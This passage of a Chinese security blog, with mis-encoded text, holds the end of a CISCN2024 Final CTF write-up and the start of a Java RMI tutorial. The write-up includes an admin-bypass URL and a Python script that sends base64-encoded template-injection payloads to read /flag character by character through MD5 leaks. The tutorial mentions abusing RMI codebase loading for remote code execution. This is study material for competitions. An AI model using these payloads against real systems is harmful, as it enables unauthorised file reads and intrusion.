alt="image-20240728002829857"></p><p>æ˜¾ç„¶è¿™é‡Œå¯ä»¥ç›´æ¥è¯»æ–‡ä»¶ï¼Œä½†æ˜¯å›æ˜¾éœ€è¦ç±»ä¼¼ç›²æ³¨çš„æ‰‹æ®µï¼Œä¸€ä¸ªä¸ªå­—ç¬¦è¯»å‡ºæ¥ï¼ˆtqlå­¦é•¿wwwwwï¼‰ï¼Œç„¶åä¸‹é¢å®ƒä¼šè‡ªå·±æŠŠè¯»åˆ°çš„ä¸œè¥¿è¿›è¡ŒMD5åŠ å¯†å¹¶æ‰“åœ¨ç½‘é¡µä¸Šã€‚</p><p>è¿™ä¸ª&#x2F;envä¹Ÿå¯ä»¥çœ‹ä¸€ä¸‹ï¼Œåæ­£éƒ½æ˜¯jdk1.8æ‰€ä»¥æ„ä¹‰ä¸å¤§ã€‚</p><p>æ‰€ä»¥æ€è·¯å°±æœ‰äº†ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>ã€ æ ¹è·¯ç”±<span class="hljs-keyword">admin</span>ç»•è¿‡æ‹¿<span class="hljs-keyword">password</span><br><span class="hljs-number">2</span>ã€ å¸¦<span class="hljs-keyword">password</span>è®¿é—®/renderï¼Œtpä½¿ç”¨base64åŠ å¯†çš„æ¶æ„æ³¨å…¥payloadè¯»flagï¼Œç”±MD5æ ¼å¼çˆ†å‡º<br><span class="hljs-number">3</span>ã€ MD5ä¸€ä¸ªä¸ªå­—ç¬¦çˆ†ç ´<br></code></pre></td></tr></table></figure><p>çœ‹èµ·æ¥è¿˜æŒºç®€å•ï¼Œä½†æ˜¯æ–­ç½‘ç¯å¢ƒç¡®å®å¾ˆæŠ˜ç£¨ï¼Œæ€»æœ‰é‚£ä¹ˆå‡ ä¸ªç¯å¢ƒé—®é¢˜ï¼Œè€Œä¸”å®¡è®¡éœ€è¦é è‡ªå·±ï¼Œæ¯”èµ›ä¹Ÿå¾ˆç´§å¼ ï¼Œæ‰€ä»¥åšå‡ºæ¥çš„äººç¡®å®å¾ˆç‰›è‡³äº†ã€‚</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>è¿™é‡Œæˆ‘åœ¨vpsä¸Šè‡ªæ­ç¯å¢ƒæµ‹è¯•ï¼š</p><p>å…ˆadminç»•è¿‡ï¼Œä½†æ˜¯è¦urlç¼–ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">&lt;url&gt;/?username=adm%C4%B1n<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728003302893.png" alt="image-20240728003302893"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> hashlib<br><br>hash_string = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100000</span>):<br>    payload = base64.b64encode((<span class="hljs-string">&#x27;$&#123;@java.util.Arrays.toString(@org.antlr.v4.runtime.misc.Utils.readFile(&quot;/flag&quot;)).charAt(&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;)&#125;&#x27;</span>).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    rsp = requests.get(<span class="hljs-string">f&#x27;http://vps:8888/render?pass=FuTKLliOry&amp;tp=<span class="hljs-subst">&#123;payload&#125;</span>&#x27;</span>)<br>    soup = BeautifulSoup(rsp.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    md5_element = soup.select_one(<span class="hljs-string">&#x27;div#title-desktop&#x27;</span>)<br>    <span class="hljs-keyword">if</span> md5_element <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        md5val = md5_element.text<br>        <span class="hljs-built_in">print</span>(md5val)<br>        hash_string.append(md5val)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>hash_string = <span class="hljs-string">&#x27;\n&#x27;</span>.join(hash_string)<br><br><span class="hljs-built_in">map</span> = <span class="hljs-built_in">dict</span>()<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> string.printable:<br>    <span class="hljs-built_in">map</span>[hashlib.md5(c.encode()).hexdigest()] = c<br><br>val = hash_string.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(val))<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> cc <span class="hljs-keyword">in</span> val:<br>    <span class="hljs-keyword">if</span> cc <span class="hljs-keyword">in</span> <span class="hljs-built_in">map</span>:<br>        flag += <span class="hljs-built_in">map</span>[cc]<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>ç„¶åè¯»æ–‡ä»¶ä¸€ä¸ªä¸ªå­—ç¬¦MD5çˆ†ç ´ï¼š</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728003427355.png" alt="image-20240728003427355"></p><p>åœ¨æ­¤ä½©æœä¸€ä¸‹å­¦é•¿çš„ç‰›è‡³åšæ³•ï¼Œæ¯”èµ›åœºä¸Šä¿©å­¦é•¿éƒ½ç”¨ç±»ä¼¼è¿™ç§æ–¹æ³•åšçš„ï¼Œéƒ½tql~~~orz</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI</title>
    <link href="/2024/07/18/RMI-JNDI/"/>
    <url>/2024/07/18/RMI-JNDI/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é¦–å…ˆäº†è§£ä¸€ä¸‹å•¥æ˜¯RMIã€‚</p><p><code>RMIï¼šRemote Method Invocation</code> è¿œç¨‹æ–¹æ³•è°ƒç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">RMIä¸ºåº”ç”¨æä¾›äº†è¿œç¨‹è°ƒç”¨çš„æ¥å£ï¼ˆJavaçš„RPCæ¡†æ¶ï¼‰<br>è°ƒç”¨è¿œç¨‹ä½ç½®å¯¹è±¡çš„æ–¹æ³•<br>å®ç°RMIçš„åè®®å«JRMP<br>RMIå®ç°è¿‡ç¨‹å­˜åœ¨Javaå¯¹è±¡çš„ä¼ é€’ï¼Œå› æ­¤æ¶‰åŠåˆ°ååºåˆ—åŒ–<br></code></pre></td></tr></table></figure><p>åŸºæœ¬ä¸Šä»javaååºåˆ—åŒ–å–ç»å‡ºæ¥ï¼Œé‡åˆ°ä¸”ç»•ä¸å¼€çš„åº”è¯¥æ˜¯å„ä¸ªCCé“¾ï¼Œè€Œä¸”å¾ˆå¤šçš„javaååºåˆ—åŒ–éå¸¸å…·æœ‰ç¼åˆæ€ªçš„é£æ ¼ï¼Œåœ¨å‰æœŸå­¦ä¸šå‹åŠ›ä¸‹æ²¡åŠæ³•ç³»ç»Ÿå½’çº³ï¼ŒçŸ¥è¯†ä¹Ÿé›¶é›¶æ•£æ•£ï¼Œè¿™é‡Œå°±åšä¸€ä¸ªç³»ç»ŸåŒ–çš„å¤ç›˜ã€‚</p><p>ä½†æ˜¯CCé“¾å¤ªå…·æœ‰ä»£è¡¨æ€§äº†ï¼Œæ‰€ä»¥æˆ‘æƒ³å…ˆå†™å†™æˆ‘ç¬¬ä¸€æ¬¡æ‰“åˆ°javaé¢˜çš„æ—¶å€™é‡åˆ°çš„RMI&#x2F;JNDIé—®é¢˜ï¼Œå°±æ˜¯NCTF2023çš„loggingç­¾åˆ°é¢˜ï¼Œé‚£é“log4jè™½ç„¶å¾ˆç®€å•åœ°æ‰“acceptå¤´å°±èƒ½RCEï¼Œä½†æ˜¯èµ·çš„å·¥å…·ä¹Ÿå°±æ˜¯JNDIæ³¨å…¥çš„å·¥å…·ï¼Œæ‰€ä»¥è®©æˆ‘è®°å¿†çŠ¹æ–°ã€‚</p><p>ç„¶è€Œå…‰é å·¥å…·å°å­å½“ç„¶æ˜¯ä¸èƒ½è§£å†³é—®é¢˜çš„ï¼Œå¤§å¤šæ˜¯çš„EXPéƒ½æ˜¯ç°åœºåŠ¨è°ƒè€Œæ‰‹å¯¼æ‰‹å†™ï¼Œè€Œä¸”çº¿ä¸‹æ–­ç½‘ç¯å¢ƒæ³¨å®šä¸èƒ½åå¼¹shellè€Œåˆ™å¿…é¡»ä½¿ç”¨å†…å­˜é©¬ä¹Ÿä½¿å¾—javaåœ¨webé¢˜å†…æœ€å°‘è§£çš„æƒ…å†µï¼Œå›½èµ›ä¹Ÿé‡åˆ°äº†è§¦ç›®æƒŠå¿ƒçš„é›¶è§£ã€‚åå°„å’Œç±»åŠ è½½æˆ‘å°±ä¸å†èµ˜è¿°ï¼Œå› ä¸ºè¿™ç®—æ˜¯æœ€åŸºæœ¬çš„javaååºåˆ—åŒ–å…¥é—¨çŸ¥è¯†ã€‚</p><p>ä¸ºå±è”½ç½‘ç»œé€šä¿¡çš„å¤æ‚æ€§ï¼ŒRMIå¼•å…¥ä¸¤ä¸ªæ¦‚å¿µï¼Œå®¢æˆ·ç«¯å­˜æ ¹Stubå’ŒæœåŠ¡ç«¯éª¨æ¶Skeleton</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">å½“<span class="hljs-variable">Client</span>è¯•å›¾è°ƒç”¨ä¸€ä¸ªè¿œç«¯çš„<span class="hljs-variable">Object</span>ï¼Œå®é™…è°ƒç”¨çš„æ˜¯å®¢æˆ·ç«¯æœ¬åœ°çš„ä¸€ä¸ªä»£ç†ç±»ï¼ˆå°±æ˜¯<span class="hljs-built_in">Stub</span>ï¼‰<br><br>è°ƒç”¨<span class="hljs-variable">Server</span>çš„ç›®æ ‡ç±»ä¹‹å‰ï¼Œä¼šç»è¿‡ä¸€ä¸ªè¿œç«¯ä»£ç†ç±»ï¼ˆå°±æ˜¯<span class="hljs-built_in">Skeleton</span>ï¼‰ï¼Œå®ƒä»<span class="hljs-built_in">Stub</span>æ¥æ”¶è¿œç¨‹æ–¹æ³•è°ƒç”¨å¹¶ä¼ é€’ç»™çœŸæ­£çš„ç›®æ ‡ç±»<br><br><span class="hljs-built_in">Stub</span>å’Œ<span class="hljs-built_in">Skeleton</span>çš„è°ƒç”¨å¯¹äº<span class="hljs-variable">RMI</span>æœåŠ¡çš„ä½¿ç”¨è€…æ˜¯éšè—çš„<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/RMI-JNDI/1.png" alt="1"></p><p><img src="/2024/07/18/RMI-JNDI/2.png" alt="2"></p><p><strong>ä»£ç è§„åˆ™</strong></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½éœ€å®šä¹‰ç”¨äºè¿œç¨‹è°ƒç”¨çš„æ¥å£<br><br>æ¥å£å¿…é¡»ç»§æ‰¿`java.rmi.Remote`æ¥å£<br><br>æ¥å£ä¸­çš„æ–¹æ³•éƒ½è¦æŠ›å‡º`java.rmi.RemoteException`å¼‚å¸¸<br><br>æœåŠ¡ç«¯åˆ›å»ºæ¥å£å®ç°ç±»ï¼Œå®ç°æ¥å£å®šä¹‰çš„æ–¹æ³•<br><br>å®ç°ç±»ç»§æ‰¿`java.rmi.server.UnicastRemoteObject`<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ±‚å®ç°ç±»ç»§æ‰¿<code>UnicastRemoteObject</code>ï¼Œæ–¹ä¾¿è‡ªåŠ¨å°†è¿™ä¸ªè¿œç¨‹å¯¹è±¡å¯¼å‡ºä¾›å®¢æˆ·ç«¯è°ƒç”¨</p><p>å½“ç„¶ä¸ç»§æ‰¿ä¹Ÿè¡Œï¼Œä½†åé¢å¾—æ‰‹åŠ¨è°ƒç”¨<code>UnicastRemoteObject#exportObject</code>ï¼Œå¯¼å‡ºå¯¹è±¡æ—¶å¯ä»¥æŒ‡å®šç›‘å¬ç«¯å£æ¥æ¥æ”¶<code>incoming calls</code>ï¼Œé»˜è®¤ä¸ºéšæœºç«¯å£ã€‚ç”±ä¸Šå›¾å¯çŸ¥è¿œç¨‹å¯¹è±¡ä¼šè¢«æ³¨å†Œåˆ°<code>RMI Registry</code>ä¸­ï¼Œæ‰€ä»¥å®é™…ä¸Šä¸éœ€è¦é€šè¿‡æ³¨å†Œä¸­å¿ƒï¼Œåªè¦æˆ‘ä»¬çŸ¥é“å¯¼å‡ºçš„è¿œç¨‹å¯¹è±¡ç›‘å¬çš„ç«¯å£å·ï¼Œä¹Ÿå¯ä»¥å’Œå®ƒç›´æ¥é€šä¿¡ã€‚</p><p><code>RMI Registry</code>æ³¨å†Œä¸­å¿ƒå­˜å‚¨ç€è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ï¼ˆReferenceï¼‰å’Œå…¶ç»‘å®šçš„åç§°ï¼ˆNameï¼‰ï¼Œå®¢æˆ·ç«¯é€šè¿‡åç§°æ‰¾åˆ°è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ï¼ˆReferenceï¼‰ï¼Œå†ç”±è¿™ä¸ªå¼•ç”¨å°±å¯ä»¥è°ƒç”¨åˆ°è¿œç¨‹å¯¹è±¡äº†ã€‚</p><h2 id="æ­¥éª¤ä»£ç "><a href="#æ­¥éª¤ä»£ç " class="headerlink" title="æ­¥éª¤ä»£ç "></a>æ­¥éª¤ä»£ç </h2><p><strong>Server</strong></p><p>éœ€è¦è¿œç¨‹è°ƒç”¨çš„æ¥å£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥å£å®ç°ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RemoteInterface</span> &#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello My Friend&quot;</span>;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> name.getClass().getName();<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bye&quot;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šå¸¸ä½¿ç”¨ <code>LocateRegistry#createRegistry()</code> æ–¹æ³•æ¥åˆ›å»ºæ³¨å†Œä¸­å¿ƒï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Registry</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br>LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>System.out.println(<span class="hljs-string">&quot;Server Start&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°†å¾…è°ƒç”¨çš„ç±»è¿›è¡Œç»‘å®šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteServer</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, MalformedURLException, AlreadyBoundException, InterruptedException &#123;<br><span class="hljs-comment">// åˆ›å»ºè¿œç¨‹å¯¹è±¡</span><br><span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObject</span>();<br><span class="hljs-comment">// ç»‘å®š</span><br>Naming.bind(<span class="hljs-string">&quot;rmi://localhost:1099/Hello&quot;</span>, remoteObject);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç›´æ¥æ•´åˆåˆ°Serverå¤„æ³¨å†Œè¿œç¨‹å¯¹è±¡ï¼Œä½¿ç”¨<code>LocateRegistry#createRegistry()</code>æ¥åˆ›å»ºæ³¨å†Œä¸­å¿ƒï¼Œ<code>Registry#bind()</code>è¿›è¡Œç»‘å®šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObject</span>();<br>        Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, remoteObject);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Naming æä¾›äº†æŸ¥è¯¢ï¼ˆlookupï¼‰ã€ç»‘å®šï¼ˆbindï¼‰ã€é‡æ–°ç»‘å®šï¼ˆrebindï¼‰ã€æ¥è§¦ç»‘å®šï¼ˆunbindï¼‰ã€listï¼ˆåˆ—è¡¨ï¼‰ç”¨æ¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œæ“ä½œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒNaming æ˜¯ä¸€ä¸ªç”¨æ¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œæ“ä½œçš„ç±»ã€‚è€Œè¿™äº›æ–¹æ³•çš„å…·ä½“å®ç°ï¼Œå…¶å®æ˜¯è°ƒç”¨ <code>LocateRegistry.getRegistry</code> æ–¹æ³•è·å–äº† Registry æ¥å£çš„å®ç°ç±»ï¼Œå¹¶è°ƒç”¨å…¶ç›¸å…³æ–¹æ³•è¿›è¡Œå®ç°çš„ã€‚</p><p>è¿™äº›æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°éƒ½æ¥æ”¶ä¸€ä¸ªURLå­—ç¬¦ä¸²ï¼Œ<code>rmi://host:port/name</code>ï¼Œè¡¨ç¤ºæ³¨å†Œä¸­å¿ƒæ‰€åœ¨ä¸»æœºå’Œç«¯å£ï¼Œè¿œç¨‹å¯¹è±¡å¼•ç”¨çš„åç§°ã€‚</p><p>ä¸€èˆ¬æ³¨å†Œä¸­å¿ƒå’ŒæœåŠ¡ç«¯éƒ½åœ¨åŒä¸€ä¸»æœºã€‚</p><p><strong>Client</strong></p><p>å®¢æˆ·ç«¯ä¹Ÿéœ€è¦å®šä¹‰å’ŒæœåŠ¡ç«¯ç›¸åŒçš„è¿œç¨‹æ¥å£ï¼Œç„¶åè¿›è¡Œè°ƒç”¨ï¼š</p><p><code>LocateRegistry#getRegistry()</code>è¿æ¥æ³¨å†Œä¸­å¿ƒï¼Œ<code>Registry#lookup()</code>è·å–è¿œç¨‹å¯¹è±¡çš„å­˜æ ¹ï¼Œé€šè¿‡åç§°æŸ¥æ‰¾ã€‚æ³¨å†Œä¸­å¿ƒé»˜è®¤ç«¯å£1099</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException &#123;<br><span class="hljs-comment">// sun.rmi.registry.RegistryImpl_Stub</span><br><span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br>System.out.println(Arrays.toString(registry.list()));<br><span class="hljs-comment">// lookup and call</span><br><span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (RemoteInterface) registry.lookup(<span class="hljs-string">&quot;Hello&quot;</span>);<br>System.out.println(stub.sayHello());<br>System.out.println(stub.sayGoodbye());<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ RemoteInterface æ¥å£åœ¨ Client&#x2F;Server&#x2F;Registry å‡åº”è¯¥å­˜åœ¨ï¼Œåªä¸è¿‡é€šå¸¸ Registry ä¸ Server é€šå¸¸åœ¨åŒä¸€ç«¯ä¸Šã€‚</p><p>RMIæ”¯æŒåŠ¨æ€ç±»åŠ è½½æ¥è¿›è¡Œååºåˆ—åŒ–ã€‚ä¸Šé¢çš„è¿œç¨‹æ–¹æ³•è°ƒç”¨æ¶‰åŠæ–¹æ³•å‚æ•°çš„ä¼ é€’ï¼Œè‹¥å®¢æˆ·ç«¯ä¼ é€’äº†ä¸€ä¸ªæœåŠ¡ç«¯ä¸å­˜åœ¨çš„ç±»å¯¹è±¡ï¼ŒæœåŠ¡ç«¯å¦‚ä½•è¿›è¡Œååºåˆ—åŒ–å‘¢ï¼Ÿ</p><p>æœ€åè¿˜æœ‰ä¸ªå°trickï¼Œé¦–å…ˆæ˜¯åŠ¨æ€ç±»åŠ è½½ï¼Œå¦‚æœå®¢æˆ·ç«¯åœ¨è°ƒç”¨æ—¶ï¼Œä¼ é€’äº†ä¸€ä¸ªå¯åºåˆ—åŒ–å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡åœ¨æœåŠ¡ç«¯ä¸å­˜åœ¨ï¼Œåˆ™åœ¨æœåŠ¡ç«¯ä¼šæŠ›å‡º ClassNotFound çš„å¼‚å¸¸ï¼Œä½†æ˜¯ RMI æ”¯æŒåŠ¨æ€ç±»åŠ è½½ï¼Œè‹¥è®¾ç½®äº†<code>java.rmi.server.codebase</code>ï¼Œåˆ™æœåŠ¡ç«¯ä¼šå°è¯•ä»å…¶åœ°å€è·å– <code>.class</code> å¹¶åŠ è½½åŠååºåˆ—åŒ–ã€‚åŠ è½½å­—èŠ‚ç ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.setProperty(<span class="hljs-string">&quot;java.rmi.server.codebase&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:9999/&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>æ‰€ä»¥ï¼Œæ‰“ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œæ¶æ„Serverç«¯å¯ä»¥å¦‚æ­¤å­˜æ”¾æ¶æ„classå­—èŠ‚ç ï¼Œè®©Clientæ¥è°ƒç”¨ä»è€ŒRCEã€‚</strong></p><p>å¯ä½¿ç”¨ <code>System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:9999/&quot;);</code> è¿›è¡Œè®¾ç½®ï¼Œæˆ–ä½¿ç”¨å¯åŠ¨å‚æ•° <code>-Djava.rmi.server.codebase=&quot;http://127.0.0.1:9999/&quot;</code> è¿›è¡ŒæŒ‡å®šã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å®‰å…¨ç­–ç•¥çš„è®¾ç½®ï¼Œå› ä¸ºæˆ‘ä»¬é€šè¿‡ç½‘ç»œåŠ è½½å¤–éƒ¨ç±»å¹¶æ‰§è¡Œæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»è¦æœ‰ä¸€ä¸ªå®‰å…¨ç®¡ç†å™¨æ¥è¿›è¡Œç®¡ç†ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®å®‰å…¨ç®¡ç†ï¼Œåˆ™ RMI ä¸ä¼šåŠ¨æ€åŠ è½½ä»»ä½•ç±»ï¼Œé€šå¸¸æˆ‘ä»¬ä½¿ç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span>) &#123;<br>    System.setSecurityManager(<span class="hljs-keyword">new</span> <span class="hljs-title 